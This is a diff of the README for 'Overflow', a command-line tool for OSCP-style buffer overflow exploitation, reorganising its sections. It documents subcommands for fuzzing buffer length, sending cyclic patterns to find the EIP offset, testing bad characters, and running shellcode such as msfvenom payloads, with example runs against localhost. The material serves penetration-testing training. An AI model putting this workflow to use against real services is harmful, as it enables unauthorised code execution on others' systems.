@@ -1,8 +1,15 @@
 # Overflow
-Overflow is a command-line tool you can use to exploit OSCP-style buffer
-overflows.
 
-Note: Exploit & chars functionality not yet implemented.
+![Build Status](https://img.shields.io/github/workflow/status/sradley/overflow/Test?style=flat-square)
+![Latest Release](https://img.shields.io/github/v/release/sradley/overflow?style=flat-square)
+![Downloads](https://img.shields.io/github/downloads/sradley/overflow/total?style=flat-square)
+![Issues](https://img.shields.io/github/issues/sradley/overflow?style=flat-square)
+![Go Version](https://img.shields.io/github/go-mod/go-version/sradley/overflow?style=flat-square)
+
+Overflow is a command-line tool used for exploiting OSCP-style buffer
+overflow vulnerabilities with a focus on rapid exploitation. However, I would
+**strongly** suggest that you understand everything that this tool can do,
+particularly if you're planning on getting your OSCP certification. Have fun!
 
 ![fuzz.gif](doc/fuzz.gif)
 
@@ -57,13 +64,55 @@ The `fuzz` subcommand sends increasingly large sequences of bytes (the increase
 is specifed by the "step" flag) until the service crashes. This tool also
 outputs the possible size of the buffer, in case it wasn't easy enough already. 
 
-#### Fuzz Usage
 The required flags are "host", "port" and "step".
 ```
 $ overflow fuzz (-H|--host HOST) (-P|--port PORT) (-S|--step STEP) [flags]
 ```
 
-#### Fuzz Example
+### Sending Cyclic Patterns
+Why would you want to do this? Well, sending a cyclic pattern of bytes to the
+target service is a very easy way to figure out the offset of the EIP register.
+Tools like `mona` can automatically determine the offset of particular
+registers if buffer has been overflowed with a cyclic pattern of bytes.
+
+The `pattern` subcommand streamlines the process of generating a cyclic pattern
+of bytes and sending it to the target service. Turning what is normally an
+annoying multi-step process into a single command.
+
+The required flags are "host", "port" and "length".
+```
+$ overflow pattern (-H|--host HOST) (-P|--port PORT) (-l|--length LENGTH) [flags]
+```
+
+### Sending Bad Characters
+An important part of buffer overflow exploitation is determining which
+characters are "bad", or which characters are treated differently by the target
+service.
+
+The `chars` subcommand sends every character from 0x00 to 0xFF to the target
+service. You can optionally exclude particular characters from the payload sent
+to the target service.
+
+Required flags are "host", "port" and "offset".
+```
+$ overflow chars (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) [flags]
+```
+
+### Running Exploits
+Once you've found the offset of the EIP register, and a valid jump address, you
+can execute shellcode on the target service. The `exploit` subcommand provides
+an easy way to do so.
+
+Required parameters are "host", "port", "offset", "jump" and "shell". Where
+shell is the path to your desired payload.
+```
+$ overflow exploit (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) \
+    (-j|--jump JUMP) (-S|--shell SHELL) [flags]
+```
+
+## Examples
+
+### Fuzzing for Buffer Length
 Here's a quick example using this subcommand to fuzz for the length of the
 target buffer in 100-byte steps.
 ```
@@ -104,23 +153,7 @@ $ overflow fuzz -H 127.0.0.1 -P 4444 -S 100
  Success! Length of buffer is in range (400, 500].
 ```
 
-### Sending Cyclic Patterns
-Why would you want to do this? Well, sending a cyclic pattern of bytes to the
-target service is a very easy way to figure out the offset of the EIP register.
-Tools like `mona` can automatically determine the offset of particular
-registers if buffer has been overflowed with a cyclic pattern of bytes.
-
-The `pattern` subcommand streamlines the process of generating a cyclic pattern
-of bytes and sending it to the target service. Turning what is normally an
-annoying multi-step process into a single command.
-
-#### Pattern Usage
-The required flags are "host", "port" and "length".
-```
-$ overflow pattern (-H|--host HOST) (-P|--port PORT) (-l|--length LENGTH) [flags]
-```
-
-#### Pattern Example
+### Sending Cyclic patterns
 Here's a quick example using this subcommand to send a 60-byte cyclic pattern
 to the target service.
 ```
@@ -162,21 +195,6 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac
 ```
 
 ### Sending Bad Characters
-An important part of buffer overflow exploitation is determining which
-characters are "bad", or which characters are treated differently by the target
-service.
-
-The `chars` subcommand sends every character from 0x00 to 0xFF to the target
-service. You can optionally exclude particular characters from the payload sent
-to the target service.
-
-#### Chars Usage
-Required flags are "host", "port" and "offset".
-```
-$ overflow chars (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) [flags]
-```
-
-#### Chars Example
 Here's an example showing the use of this subcommand. Make sure you include the
 offset to the EIP register.
 ```
@@ -246,19 +264,6 @@ $ overflow chars -H 127.0.0.1 -P 4444 -o 160 -e "\x00\x41\xAB\x01"
 ```
 
 ### Running Exploits
-Once you've found the offset of the EIP register, and a valid jump address, you
-can execute shellcode on the target service. The `exploit` subcommand provides
-an easy way to do so.
-
-#### Exploit Usage
-Required parameters are "host", "port", "offset", "jump" and "shell". Where
-shell is the path to your desired payload.
-```
-$ overflow exploit (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) \
-    (-j|--jump JUMP) (-S|--shell SHELL) [flags]
-```
-
-#### Exploit Example
 Here's a brief example explaining how you can use the `exploit` subcommand to
 execute a payload generated by `msfvenom`.
 
@@ -302,4 +307,3 @@ $ overflow exploit -H 127.0.0.1 -P 4444 -o 160 -j "0x5f4a358f" -S path/to/payloa
  
  Success! No errors found.
 ```
-
